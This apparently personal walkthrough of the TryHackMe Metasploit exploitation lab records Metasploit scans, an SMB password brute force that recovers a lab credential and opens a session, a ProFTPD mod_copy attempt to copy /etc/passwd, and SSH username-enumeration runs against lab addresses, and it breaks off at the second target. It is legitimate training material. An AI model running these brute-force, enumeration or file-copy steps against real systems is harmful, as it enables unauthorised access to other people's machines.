# TryHackMe: Metasploit: Exploitation Room Summary

Room URL: https://tryhackme.com/room/metasploitexploitation

## Introduction

The topics we will cover are:

- How to scan target systems using Metasploit.
- How to use the Metasploit database feature.
- How to use Metasploit to conduct a vulnerability scan.
- How to use Metasploit to exploit vulnerable services on target systems.
- How `msfvenom` can be used to create payloads and obtain a Meterpreter session on the target system.

## Scanning

### TCP Scanner

```bash
msf6 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce              .                normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan          .                normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner      .                normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                   .                normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                    .                normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                    .                normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                    .                normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access  .                normal  No     Wordpress Pingback Locator

Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access
msf6 > use 5
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to che
                                           ck per host
   DELAY        0                yes       The delay between connections, per th
                                           read, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum valu
                                           e by which to +/- DELAY) in milliseco
                                           nds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), see https://docs.
                                           metasploit.com/docs/using-metasploit/
                                           basics/using-metasploit.html
   THREADS      1                yes       The number of concurrent threads (max
                                            one per host)
   TIMEOUT      1000             yes       The socket connect timeout in millise
                                           conds

msf6 auxiliary(scanner/portscan/tcp) > 

6 auxiliary(scanner/portscan/tcp) > 
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.10.213.181
RHOSTS => 10.10.213.181
msf6 auxiliary(scanner/portscan/tcp) > run
[+] 10.10.213.181         - 10.10.213.181:22 - TCP OPEN
[+] 10.10.213.181         - 10.10.213.181:21 - TCP OPEN
[+] 10.10.213.181         - 10.10.213.181:139 - TCP OPEN
[+] 10.10.213.181         - 10.10.213.181:445 - TCP OPEN
[+] 10.10.213.181         - 10.10.213.181:8000 - TCP OPEN
[*] 10.10.213.181         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

### UDP scanner

```bash
msf6 auxiliary(scanner/portscan/tcp) > search scanner type:auxiliary discovery udp

Matching Modules
================

   #  Name                                          Disclosure Date  Rank    Check  Description
   -  ----                                          ---------------  ----    -----  -----------
   0  auxiliary/scanner/scada/moxa_discover         .                normal  No     Moxa UDP Device Discovery
   1  auxiliary/scanner/pcanywhere/pcanywhere_udp   .                normal  No     PcAnywhere UDP Service Discovery
   2  auxiliary/scanner/discovery/empty_udp         .                normal  No     UDP Empty Prober
   3  auxiliary/scanner/discovery/udp_probe         .                normal  No     UDP Service Prober
   4  auxiliary/scanner/discovery/udp_sweep         .                normal  No     UDP Service Sweeper
   5  auxiliary/scanner/ubiquiti/ubiquiti_discover  .                normal  No     Ubiquiti Discovery Scanner

Interact with a module by name or index. For example info 5, use 5 or use auxiliary/scanner/ubiquiti/ubiquiti_discover
msf6 auxiliary(scanner/portscan/tcp) > use 4
msf6 auxiliary(scanner/discovery/udp_sweep) > show options 

Module options (auxiliary/scanner/discovery/udp_sweep):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   THREADS    10               yes       The number of concurrent threads

View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/discovery/udp_sweep) > set RHOSTS 10.10.213.181
RHOSTS => 10.10.213.181
msf6 auxiliary(scanner/discovery/udp_sweep) > run
[*] Sending 13 probes to 10.10.213.181->10.10.213.181 (1 hosts)
[*] Discovered NetBIOS on 10.10.213.181:137 (ACME IT SUPPORT:<00>:G :ACME IT SUPPORT:<1e>:G :IP-10-10-213-18:<00>:U :IP-10-10-213-18:<03>:U :IP-10-10-213-18:<20>:U :00:00:00:00:00:00)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/discovery/udp_sweep) > 
```

### SMB Scanner

```basic
msf6 auxiliary(scanner/smb/smb_enumusers) > search scanner type:auxiliary  smb

Matching Modules
================

   #   Name                                                            Disclosure Date  Rank    Check  Description
   -   ----                                                            ---------------  ----    -----  -----------
   0   auxiliary/scanner/http/citrix_dir_traversal                     2019-12-17       normal  No     Citrix ADC (NetScaler) Directory Traversal Scanner
   1   auxiliary/scanner/smb/impacket/dcomexec                         2018-03-19       normal  No     DCOM Exec
   2   auxiliary/scanner/smb/impacket/secretsdump                      .                normal  No     DCOM Exec
   3   auxiliary/scanner/dcerpc/dfscoerce                              .                normal  No     DFSCoerce
   4   auxiliary/scanner/smb/smb_ms17_010                              .                normal  No     MS17-010 SMB RCE Detection
   5     \_ AKA: DOUBLEPULSAR                                          .                .       .      .
   6     \_ AKA: ETERNALBLUE                                           .                .       .      .
   7   auxiliary/scanner/smb/psexec_loggedin_users                     .                normal  No     Microsoft Windows Authenticated Logged In Users Enumeration
   8   auxiliary/scanner/dcerpc/petitpotam                             .                normal  No     PetitPotam
   9   auxiliary/scanner/sap/sap_smb_relay                             .                normal  No     SAP SMB Relay Abuse
   10  auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing    .                normal  No     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
   11  auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence  .                normal  No     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
   12  auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                 .                normal  No     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
   13  auxiliary/scanner/smb/smb_enumusers_domain                      .                normal  No     SMB Domain User Enumeration
   14  auxiliary/scanner/smb/smb_enum_gpp                              .                normal  No     SMB Group Policy Preference Saved Passwords Enumeration
   15  auxiliary/scanner/smb/smb_login                                 .                normal  No     SMB Login Check Scanner
   16  auxiliary/scanner/smb/smb_lookupsid                             .                normal  No     SMB SID User Enumeration (LookupSid)
   17    \_ action: DOMAIN                                             .                .       .      Enumerate domain accounts
   18    \_ action: LOCAL                                              .                .       .      Enumerate local accounts
   19  auxiliary/admin/smb/check_dir_file                              .                normal  No     SMB Scanner Check File/Directory Utility
   20  auxiliary/scanner/smb/pipe_auditor                              .                normal  No     SMB Session Pipe Auditor
   21  auxiliary/scanner/smb/pipe_dcerpc_auditor                       .                normal  No     SMB Session Pipe DCERPC Auditor
   22  auxiliary/scanner/smb/smb_enumshares                            .                normal  No     SMB Share Enumeration
   23  auxiliary/scanner/smb/smb_enumusers                             .                normal  No     SMB User Enumeration (SAM EnumUsers)
   24  auxiliary/scanner/smb/smb_version                               .                normal  No     SMB Version Detection
   25  auxiliary/scanner/snmp/snmp_enumshares                          .                normal  No     SNMP Windows SMB Share Enumeration
   26  auxiliary/scanner/smb/smb_uninit_cred                           .                normal  Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   27  auxiliary/scanner/smb/impacket/wmiexec                          2018-03-19       normal  No     WMI Exec

Interact with a module by name or index. For example info 27, use 27 or use auxiliary/scanner/smb/impacket/wmiexec

msf6 auxiliary(scanner/smb/smb_enumusers) > 

```

**SMB Share Enumeration:**

```bash
msf6 auxiliary(scanner/smb/smb_enumshares) > run
[+] 10.10.213.181:139 - print$ - (DISK) Printer Drivers
[+] 10.10.213.181:139 - IPC$ - (IPC|SPECIAL) IPC Service (ip-10-10-213-181 server (Samba, 1776))
[*] 10.10.213.181: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_enumshares) > 

```

**SMB Version Discovery:**

```bash
msf6 auxiliary(scanner/smb/smb_version) > run
[*] 10.10.213.181:445     - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{00000000-0000-0000-0000-000000000000}) (authentication domain:IP-10-10-213-181)
[+] 10.10.213.181:445     -   Host is running Version 6.1.0 (unknown OS)
[*] 10.10.213.181         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

**SMB Users Enumeration:** Just set the RHOSTS

```bash
msf6 auxiliary(scanner/smb/smb_enumusers) > run
[*] 10.10.213.181:445 - Using automatically identified domain: IP-10-10-213-181
[+] 10.10.213.181:445 - IP-10-10-213-181 [ penny, sadmin ] ( LockoutTries=0 PasswordMin=5 )
[+] 10.10.213.181:445 - Builtin [  ] ( LockoutTries=0 PasswordMin=5 )
[*] 10.10.213.181: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_enumusers) > 

```

**NetBIOS Information Discovery**

```bash
msf6 auxiliary(scanner/netbios/nbname) > run
[*] Sending NetBIOS requests to 10.10.213.181->10.10.213.181 (1 hosts)
[+] 10.10.213.181 [IP-10-10-213-18] OS:Unix Names:(ACME IT SUPPORT, IP-10-10-213-18) Addresses:(10.10.213.181) Mac:00:00:00:00:00:00 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/netbios/nbname) > 

```

**SMB Login:** Fuzz Penny’s password

```bash
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.213.181
RHOSTS => 10.10.213.181
msf6 auxiliary(scanner/smb/smb_login) > set SMBUSER penny
SMBUSER => penny
msf6 auxiliary(scanner/smb/smb_login) > set STOP_ON_SUCCESS true 
STOP_ON_SUCCESS => true
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
PASS_FILE => /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
msf6 auxiliary(scanner/smb/smb_login) > run
[*] 10.10.213.181:445     - 10.10.213.181:445 - Starting SMB login bruteforce
[-] 10.10.213.181:445     - 10.10.213.181:445 - Failed: '.\penny:95',
....
[-] 10.10.213.181:445     - 10.10.213.181:445 - Failed: '.\penny:hugs',
[-] 10.10.213.181:445     - 10.10.213.181:445 - Failed: '.\penny:letmein',
[+] 10.10.213.181:445     - 10.10.213.181:445 - Success: '.\penny:leo1234'
[*] 10.10.213.181:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.213.181:445     - Bruteforce completed, 1 credential was successful.
[*] 10.10.213.181:445     - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_login) > 

```

### HTTP Version Scanner

```bash
msf6 auxiliary(scanner/http/ntlm_info_enumeration) > search scanner type:auxiliary  http_version

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/http_version  .                normal  No     HTTP Version Detection

Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/http_version

msf6 auxiliary(scanner/http/ntlm_info_enumeration) > use 0
msf6 auxiliary(scanner/http/http_version) > show options 

Module options (auxiliary/scanner/http/http_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads (max one per host)
   VHOST                     no        HTTP server virtual host

View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/http/http_version) > set RHOSTS 10.10.213.181
RHOSTS => 10.10.213.181
msf6 auxiliary(scanner/http/http_version) > set RPORT 8000
RPORT => 8000
msf6 auxiliary(scanner/http/http_version) > run
[+] 10.10.213.181:8000 webfs/1.21 ( 403-Forbidden )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

## The Metasploit Database

The **Metasploit Database** (integrated with **PostgreSQL**) is a feature in **`msfconsole`** that stores:

- **Scan results** (e.g., open ports, services, vulnerabilities).
- **Credentials** (usernames, passwords, hashes).
- **Session data** (active shells, Meterpreter sessions).
- **Host details** (IPs, OS info, discovered services).

**Why Use the Metasploit Database?**

1. **Organize Information** – Keeps track of targets during penetration tests.
2. **Avoid re-scanning** – Reuse stored data instead of repeating scans.
3. **Automate Tasks** – Tools like **`db_nmap`** save results directly to the database.
4. **Generate Reports** – Export findings for documentation.

To use **Metasploit database**, you need to run these commands:

```bash
# Start PostgreSQL (required before msfconsole)  
systemctl start postgresq

# Initialize the database in msfconsole  
sudo -u postgres msfdb init

# Check status
root@ip-10-10-36-87:~# systemctl status postgresql
\u25cf postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; enabled; vendo>
     Active: active (exited) since Wed 2025-08-06 10:47:45 BST; 1h 58min ago
   Main PID: 1293 (code=exited, status=0/SUCCESS)
      Tasks: 0 (limit: 4446)
     Memory: 0B
     CGroup: /system.slice/postgresql.service

Aug 06 10:47:45 ip-10-10-36-87 systemd[1]: Starting PostgreSQL RDBMS...
Aug 06 10:47:45 ip-10-10-36-87 systemd[1]: Finished PostgreSQL RDBMS.
lines 1-10/10 (END)

```

Checking Metasploit database status inside msfconsole

```bash
# Check status  
msf6 auxiliary(scanner/smb/smb_login) > db_status
[*] Connected to msfdb. Connection type: postgresql.
```

The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available workspaces using the `workspace` command.

### Workspace Commands

```bash
msf6 > workspace 
* default
msf6 > workspace -h
Usage:
    workspace          List workspaces
    workspace [name]   Switch workspace

OPTIONS:

    -a, --add <name>          Add a workspace.
    -d, --delete <name>       Delete a workspace.
    -D, --delete-all          Delete all workspaces.
    -h, --help                Help banner.
    -l, --list                List workspaces.
    -r, --rename <old> <new>  Rename a workspace.
    -S, --search <name>       Search for a workspace.
    -v, --list-verbose        List workspaces verbosely.

msf6 > workspace -a Tryhackme
[*] Added workspace: Tryhackme
[*] Workspace: Tryhackme
msf6 > workspace
  default
* Tryhackme
msf6 > workspace Tryhackme 
[*] Workspace: Tryhackme
msf6 > workspace
  default
* Tryhackme
msf6 >
```

## Exploitation: Target 1

**Target:** `10.10.213.181`

**Adding the scanning result to the database.**

```bash
msf6 > db_nmap -sV 10.10.213.181
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-06 13:10 BST
[*] Nmap: Nmap scan report for ip-10-10-213-181.eu-west-1.compute.internal (10.10.213.181)
[*] Nmap: Host is up (0.00054s latency).
[*] Nmap: Not shown: 995 closed ports
[*] Nmap: PORT     STATE SERVICE     VERSION
[*] Nmap: 21/tcp   open  ftp         ProFTPD 1.3.5e
[*] Nmap: 22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
[*] Nmap: 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ACME IT SUPPORT)
[*] Nmap: 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ACME IT SUPPORT)
[*] Nmap: 8000/tcp open  http        WebFS httpd 1.21
[*] Nmap: MAC Address: 02:04:82:8D:0F:AF (Unknown)
[*] Nmap: Service Info: Host: IP-10-10-213-181; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 12.59 seconds
msf6 > hosts 

Hosts
=====

address        mac                name                                         os_name  os_flavor  os_sp  purpose  info  comments
-------        ---                ----                                         -------  ---------  -----  -------  ----  --------
10.10.213.181  02:04:82:8d:0f:af  ip-10-10-213-181.eu-west-1.compute.internal  Unknown                    device

msf6 > services
Services
========

host           port  proto  name         state  info
----           ----  -----  ----         -----  ----
10.10.213.181  21    tcp    ftp          open   ProFTPD 1.3.5e
10.10.213.181  22    tcp    ssh          open   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0
10.10.213.181  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT
10.10.213.181  445   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: ACME IT SUPPORT
10.10.213.181  8000  tcp    http         open   WebFS httpd 1.21

msf6 > 

```

Look for low-hanging fruits such as:

- HTTP: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE).
- FTP: Could allow anonymous login and provide access to interesting files.
- SMB: Could be vulnerable to SMB exploits like MS17-010
- SSH: Could have default or easy to guess credentials
- RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used.

### SMB Exploit

This SMB Scanner

```bash

use auxiliary/scanner/smb/smb_ms17_010

# Set RHOSTS with this command
msf6 auxiliary(scanner/smb/smb_ms17_010) > hosts -R
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
[-] 10.10.213.181:445     - Host does NOT appear vulnerable.
[*] 10.10.213.181:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
msf6 auxiliary(scanner/smb/smb_login) > set CreateSession true 
CreateSession => true
msf6 auxiliary(scanner/smb/smb_login) > run
[*] 10.10.73.124:445      - 10.10.73.124:445 - Starting SMB login bruteforce
[+] 10.10.73.124:445      - 10.10.73.124:445 - Success: '.\penny:leo1234'
[*] SMB session 1 opened (10.10.134.116:39101 -> 10.10.73.124:445) at 2025-08-07 20:42:59 +0100
[*] 10.10.73.124:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.73.124:445      - Bruteforce completed, 1 credential was successful.
[*] 10.10.73.124:445      - 1 SMB session was opened successfully.
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_login) > sessions 

Active sessions
===============

  Id  Name  Type  Information                   Connection
  --  ----  ----  -----------                   ----------
  1         smb   SMB penny @ 10.10.73.124:445  10.10.134.116:39101 -> 10.10.73.124:445 (10.10.73.124)

msf6 auxiliary(scanner/smb/smb_login) > sessions 1
[*] Starting interaction with 1...

SMB (10.10.73.124) > 
SMB (10.10.73.124) > help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    background    Backgrounds the current session
    bg            Alias for background
    exit          Terminate the SMB session
    help          Help menu
    irb           Open an interactive Ruby shell on the current session
    pry           Open the Pry debugger on the current session
    sessions      Quickly switch to another session

Shares Commands
===============

    Command       Description
    -------       -----------
    cat           Read the file at the given path
    cd            Change the current remote working directory
    delete        Delete a file
    dir           List all files in the current directory (alias for ls)
    download      Download a file
    ls            List all files in the current directory
    mkdir         Make a new directory
    pwd           Print the current remote working directory
    rmdir         Delete a directory
    shares        View the available shares and interact with one
    upload        Upload a file

Local File System Commands
==========================

    Command       Description
    -------       -----------
    getlwd        Print local working directory (alias for lpwd)
    lcat          Read the contents of a local file to the screen
    lcd           Change local working directory
    ldir          List local files (alias for lls)
    lls           List local files
    lmkdir        Create new directory on local machine
    lpwd          Print local working directory

For more info on a specific command, use <command> -h or help <command>.

This session also works with the following modules:

  auxiliary/admin/dcerpc/icpr_cert
  auxiliary/admin/dcerpc/samr_account
  auxiliary/admin/registry_security_descriptor
  auxiliary/admin/smb/change_password
  auxiliary/admin/smb/delete_file
  auxiliary/admin/smb/download_file
  auxiliary/admin/smb/psexec_ntdsgrab
  auxiliary/admin/smb/upload_file
  auxiliary/gather/windows_secrets_dump
  auxiliary/scanner/smb/pipe_auditor
  auxiliary/scanner/smb/pipe_dcerpc_auditor
  auxiliary/scanner/smb/smb_enum_gpp
  auxiliary/scanner/smb/smb_enumshares
  auxiliary/scanner/smb/smb_enumusers
  auxiliary/scanner/smb/smb_enumusers_domain
  auxiliary/scanner/smb/smb_lookupsid
  exploit/windows/smb/psexec

SMB (10.10.73.124) > 
SMB (10.10.73.124) > shares 
Shares
======

    #  Name    Type         comment
    -  ----    ----         -------
    0  print$  DISK         Printer Drivers
    1  IPC$    IPC|SPECIAL  IPC Service (ip-10-10-73-124 server (Samba, 1776))

SMB (10.10.73.124) > 

```

### FTP Exploit

```bash
auxiliary/scanner/ftp/anonymous      Anonymous FTP Access Detection
auxiliary/scanner/ftp/ftp_login      FTP Authentication Scanne
auxiliary/scanner/ftp/ftp_version    FTP Version Scanner
```

FTP Version Scanner

```bash
msf6 auxiliary(scanner/ftp/ftp_version) > run
[+] 10.10.90.144:21       - FTP Banner: '220 ProFTPD 1.3.5e Server (Debian) [::ffff:10.10.90.144]\x0d\x0a'
[*] 10.10.90.144:21       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

FTP Anonymous Detection

```bash
msf6 auxiliary(scanner/ftp/anonymous) > run
[*] 10.10.90.144:21       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

**FTP Version Exploitation**: The target is running a vulnerable FTP server version https://www.tenable.com/cve/CVE-2017-7418. Check for:

- `CPFR` and `CPTO`  ftp command,
- Check if the HTTP service is open.
- If the exploit failed, try a different SITEPATH

```bash
^Croot@ip-10-10-120-168:~# telnet 10.10.90.144 21
Trying 10.10.90.144...
Connected to 10.10.90.144.
Escape character is '^]'.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:10.10.90.144]
SITE HELP
214-The following SITE commands are recognized (* =>'s unimplemented)
214-CPFR <sp> pathname
214-CPTO <sp> pathname
214-UTIME <sp> YYYYMMDDhhmm[ss] <sp> path
214-SYMLINK <sp> source <sp> destination
214-RMDIR <sp> path
214-MKDIR <sp> path
214-The following SITE extensions are recognized:
214-RATIO -- show all ratios in effect
214-QUOTA
214-HELP
214-CHGRP
214-CHMOD
214 Direct comments to root@ip-10-10-90-144.eu-west-1.compute.internal
root@ip-10-10-120-168:~# curl http://10.10.90.144:8000 -I
HTTP/1.1 403 Forbidden
Server: webfs/1.21
Connection: Keep-Alive
Accept-Ranges: bytes
Content-Type: text/plain
Content-Length: 14
Date: Thu, 07 Aug 2025 08:48:25 GMT
root@ip-10-10-120-168:~# ftp 10.10.90.144
Connected to 10.10.90.144.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:10.10.90.144]
Name (10.10.90.144:root): 
331 Password required for root
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> quote SITE CPFR /etc/passwd
530 Please login with USER and PASS
ftp> quote SITE CPTO /var/www
503-Bad sequence of commands
503 Bad sequence of commands
ftp> quote SITE CPTO /var/www/html
503-Bad sequence of commands
503 Bad sequence of commands
ftp> exit
221 Goodbye.
```

In our case, both FTP command CPFR and CPTO are available, but it require authentication to use it. 

### SSH Exploit

```bash
auxiliary/scanner/ssh/ssh_enumusers
auxiliary/scanner/ssh/ssh_version
auxiliary/scanner/ssh/ssh_login
auxiliary/fuzzers/ssh/ssh_version_2
auxiliary/scanner/ssh/libssh_auth_bypass
```

**SSH Version** 

```bash
msf6 auxiliary(scanner/ssh/ssh_version) > run
[*] 10.10.73.124 - Key Fingerprint: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEk5+reKaiBAjPnOfSJ6FO9WrvJwyqw+WMAf53mKMdcB
[*] 10.10.73.124 - SSH server version: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
[*] 10.10.73.124 - Server Information and Encryption
=================================

  Type                     Value                                 Note
  ----                     -----                                 ----
  encryption.compression   none
  encryption.compression   zlib@openssh.com
  encryption.encryption    chacha20-poly1305@openssh.com
  encryption.encryption    aes128-ctr
  encryption.encryption    aes192-ctr
  encryption.encryption    aes256-ctr
  encryption.encryption    aes128-gcm@openssh.com
  encryption.encryption    aes256-gcm@openssh.com
  encryption.hmac          umac-64-etm@openssh.com
  encryption.hmac          umac-128-etm@openssh.com
  encryption.hmac          hmac-sha2-256-etm@openssh.com
  encryption.hmac          hmac-sha2-512-etm@openssh.com
  encryption.hmac          hmac-sha1-etm@openssh.com
  encryption.hmac          umac-64@openssh.com
  encryption.hmac          umac-128@openssh.com
  encryption.hmac          hmac-sha2-256
  encryption.hmac          hmac-sha2-512
  encryption.hmac          hmac-sha1
  encryption.host_key      ssh-rsa
  encryption.host_key      rsa-sha2-512
  encryption.host_key      rsa-sha2-256
  encryption.host_key      ecdsa-sha2-nistp256                   Weak elliptic curve
  encryption.host_key      ssh-ed25519
  encryption.key_exchange  curve25519-sha256
  encryption.key_exchange  curve25519-sha256@libssh.org
  encryption.key_exchange  ecdh-sha2-nistp256
  encryption.key_exchange  ecdh-sha2-nistp384
  encryption.key_exchange  ecdh-sha2-nistp521
  encryption.key_exchange  diffie-hellman-group-exchange-sha256
  encryption.key_exchange  diffie-hellman-group16-sha512
  encryption.key_exchange  diffie-hellman-group18-sha512
  encryption.key_exchange  diffie-hellman-group14-sha256
  encryption.key_exchange  diffie-hellman-group14-sha1
  fingerprint_db           ssh.banner
  openssh.comment          Ubuntu-4ubuntu0.3
  os.cpe23                 cpe:/o:canonical:ubuntu_linux:18.04
  os.family                Linux
  os.product               Linux
  os.vendor                Ubuntu
  os.version               18.04
  service.cpe23            cpe:/a:openbsd:openssh:7.6p1
  service.family           OpenSSH
  service.product          OpenSSH
  service.protocol         ssh
  service.vendor           OpenBSD
  service.version          7.6p1

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

- **Server Identification**: The server is running OpenSSH 7.6p1 on Ubuntu 18.04 (Bionic Beaver)
- **Key Fingerprint**: The server's host key uses ED25519 encryption
- **Supported Features**: The output shows all supported encryption algorithms, MACs (message authentication codes), key exchange methods, and host key types

openSSH 7.6p1 has a 

[Kubernetes disclosed on HackerOne:  Username enumeration via...](https://hackerone.com/reports/776461)

```bash
root@ip-10-10-134-116:~# searchsploit openssh 7.6p1
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration      | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC | linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)          | linux/remote/45939.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results

```

```bash
root@ip-10-10-134-116:~# python sshuserenumeration.py  -u penny 10.10.73.124
/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend

User name enumeration against SSH daemons affected by CVE-2016-6210
Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari

[*] Testing SSHD at: 10.10.73.124:22, Banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
[*] Getting baseline timing for authenticating non-existing users............
[*] Baseline mean for host 10.10.73.124 is 0.004787400000000002 seconds.
[*] Baseline variation for host 10.10.73.124 is 0.00037300997305699885 seconds.
[*] Defining timing of x < 0.005906429919170999 as non-existing user.
[*] Testing your users...
[-] penny - timing: 0.004636000000000029
root@ip-10-10-134-116:~# python sshuserenumeration.py  -u aisha 10.10.73.124
/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend

User name enumeration against SSH daemons affected by CVE-2016-6210
Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari

[*] Testing SSHD at: 10.10.73.124:22, Banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
[*] Getting baseline timing for authenticating non-existing users............
[*] Baseline mean for host 10.10.73.124 is 0.004677900000000001 seconds.
[*] Baseline variation for host 10.10.73.124 is 0.00048419819289211957 seconds.
[*] Defining timing of x < 0.0061304945786763605 as non-existing user.
[*] Testing your users...
[-] aisha - timing: 0.004642000000000035
root@ip-10-10-134-116:~# python sshuserenumeration.py  -u root 10.10.73.124
/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend

User name enumeration against SSH daemons affected by CVE-2016-6210
Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari

[*] Testing SSHD at: 10.10.73.124:22, Banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
[*] Getting baseline timing for authenticating non-existing users............
[*] Baseline mean for host 10.10.73.124 is 0.005176199999999997 seconds.
[*] Baseline variation for host 10.10.73.124 is 0.0005317241390044385 seconds.
[*] Defining timing of x < 0.006771372417013312 as non-existing user.
[*] Testing your users...
[-] root - timing: 0.005774000000000001

```

## Exploitation: Target 2

**Target:** `10.10.120.17`

**Scanning the target** 

```bash
msf6 > db_nmap -sV 10.10.120.17
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-06 18:37 BST
[*] Nmap: Nmap scan report for ip-10-10-120-17.eu-west-1.compute.internal (10.10.120.17)
[*] Nmap: Host is up (0.00033s latency).
